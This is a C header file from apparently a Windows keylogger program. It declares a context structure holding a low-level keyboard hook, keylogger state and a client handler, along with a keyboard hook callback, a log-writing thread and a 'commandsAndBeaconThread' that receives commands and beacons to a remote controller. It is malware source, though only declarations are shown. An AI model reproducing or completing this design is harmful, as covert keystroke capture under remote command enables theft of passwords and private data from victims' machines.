
#include "utils.h"
#include "keyloggerstate.h"
#include "../client/client.h"

#ifndef PROGRAM_H
#define PROGRAM_H

#define SLP_CMD_THREAD 20000    // 20s
#define SLP_WRITER_THREAD 15000 // 10s
#define SLP_KEYLOGGER 125       // 0.125s


/**
 * program context structure that stores handles to the worker threads,
 * as well as 
 */
typedef struct {
    CLIENT_HANDLER* client;
    KEY_LOGGER_STATE* kLogger;
    HHOOK hLowLevelKeyHook;

    // worker thread handles
    HANDLE hCmdThread;
    HANDLE hWriteThread;
    // thread mutex handle
    HANDLE hMutexThreadSync;
    // must be volatile because it gets updated unexpecedly!
    volatile BOOL shutdown;
} PROGRAM_CONTEXT;

/**
 * program context variable that can be accessed by any file
 * that includes the program header!
 */
extern PROGRAM_CONTEXT* progContext;

PROGRAM_CONTEXT* initProgramContext(); // initiliase program context members

ERR_CODE setup();  // setups up client and program itself

ERR_CODE startThreads();  // initialises worker threads

// worker thread functions
DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam); // command reciever thread function
DWORD WINAPI writeLogThread(LPVOID lpParam);      // key write thread function
ERR_CODE runKeyLogger();

LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

void programCleanup();

void programContextCleanup(PROGRAM_CONTEXT* prCon); // cleans up PRORGAM_CONTEXT struct

#endif